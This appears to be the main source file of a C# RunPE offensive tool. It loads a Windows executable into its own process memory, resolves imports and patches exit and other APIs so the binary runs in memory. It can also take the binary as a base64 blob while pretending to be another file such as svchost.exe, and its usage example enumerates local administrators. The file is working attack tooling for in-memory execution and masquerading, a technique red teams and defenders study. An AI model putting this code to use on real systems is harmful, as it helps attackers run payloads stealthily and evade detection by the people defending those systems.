using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Linq;
using RunPE.Internals;
using RunPE.Patchers;

namespace RunPE
{
    public class Program
    {
        private const uint EXECUTION_TIMEOUT = 30000;

        internal static Encoding encoding;

        public static int Main(string[] args)
        {
            try
            {
                if (IntPtr.Size != 8)
                {
                    Console.WriteLine("\n[-] Process is not 64-bit, this version of run-exe won't work !\n");
                    return -1;
                } else

                if (args.Length == 0)
                {
                    PrintUsage();
                    return -2;
                }

                var peRunDetails = ParseArgs(args.ToList());

                if(peRunDetails == null)
                {
                    Console.WriteLine("[-] Error parsing args");
                    return -10;
                }
                var peMapper = new PEMapper();
                peMapper.MapPEIntoMemory(peRunDetails.binaryBytes, out var pe, out var currentBase);

                var importResolver = new ImportResolver();
                importResolver.ResolveImports(pe, currentBase);

                peMapper.SetPagePermissions();

                var argumentHandler = new ArgumentHandler();
                if (!argumentHandler.UpdateArgs(peRunDetails.filename, peRunDetails.args))
                {
                    return -3;
                }

                var fileDescriptorRedirector = new FileDescriptorRedirector();
                if (!fileDescriptorRedirector.RedirectFileDescriptors())
                {
                    Console.WriteLine("[-] Unable to redirect file descriptors");
                    return -7;
                }

                var extraEnvironmentalPatcher = new ExtraEnvironmentPatcher((IntPtr)currentBase);
                extraEnvironmentalPatcher.PerformExtraEnvironmentPatches();

                // Patch this last as may interfere with other activity
                var extraAPIPatcher = new ExtraAPIPatcher();

                if (!extraAPIPatcher.PatchAPIs((IntPtr)currentBase))
                {
                    return -9;
                }
                
                var exitPatcher = new ExitPatcher();
                if (!exitPatcher.PatchExit())
                {
                    return -8;
                }

                fileDescriptorRedirector.StartReadFromPipe();
                StartExecution(peRunDetails.args, pe, currentBase);

                // Revert changes
                exitPatcher.ResetExitFunctions();
                extraAPIPatcher.RevertAPIs();
                extraEnvironmentalPatcher.RevertExtraPatches();
                fileDescriptorRedirector.ResetFileDescriptors();
                argumentHandler.ResetArgs();
                peMapper.ClearPE();
                importResolver.ResetImports();

                // Print the output
                var output = fileDescriptorRedirector.ReadDescriptorOutput();

                Console.WriteLine(output);
                return 0;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error running RunPE: {e}");
                return -6;
            }
        }

        public static void StartExecution(string[] binaryArgs, PELoader pe, long currentBase)
        {

            try
            {
                var threadStart = (IntPtr)(currentBase + (int)pe.OptionalHeader64.AddressOfEntryPoint);
                var hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);

                NativeDeclarations.WaitForSingleObject(hThread, EXECUTION_TIMEOUT);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error {e}\n");
            }

        }

        public static PeRunDetails ParseArgs(List<string> args)
        {
            string filename;
            string[] binaryArgs;
            byte[] binaryBytes;

            if (args.Contains("---f") || args.Contains("---b"))
            {
                if (!(args.Contains("---f") && args.Contains("---b")))
                {
                    PrintUsage();
                    return null;
                }

                filename = args[args.IndexOf("---f") + 1];
                if (args.Contains("---a")) {
                    binaryArgs = Encoding.UTF8.GetString(Convert.FromBase64String(args[args.IndexOf("---a") + 1])).Split();
                }
                else
                {
                    binaryArgs = new string[] { };
                }

                binaryBytes = Convert.FromBase64String(args[args.IndexOf("---b") + 1]);
            }
            else
            {
                filename = args[0];
                binaryBytes = File.ReadAllBytes(filename);
                if (args.Count > 1)
                {
                    binaryArgs = new string[args.Count - 1];
                    Array.Copy(args.ToArray(), 1, binaryArgs, 0, args.Count - 1);
                }
                else
                {
                    binaryArgs = new string[] { };
                }
            }
            return new PeRunDetails { filename = filename, args = binaryArgs, binaryBytes = binaryBytes};
        }

        public static void PrintUsage()
        {
            Console.WriteLine($"Usage: RunPE.exe <file-to-run> <args-to-file-to-run>");
            Console.WriteLine($"\te.g. RunPE.exe C:\\Windows\\System32\\net.exe localgroup administrators");
            Console.WriteLine($"\nAlternative usage: RunPE.exe ---f <file-to-pretend-to-be> ---b <base64 blob of file bytes> ---a <base64 blob of args>");
            Console.WriteLine($"\te.g: RunPE.exe ---f C:\\Windows\\System32\\svchost.exe ---b <net.exe, base64 encoded> ---a <localgroup administrators, base64 encoded>");
        }

    }

    public class PeRunDetails
    {
        public  string filename;
        public  string[] args;
        public  byte[] binaryBytes;
    }

}
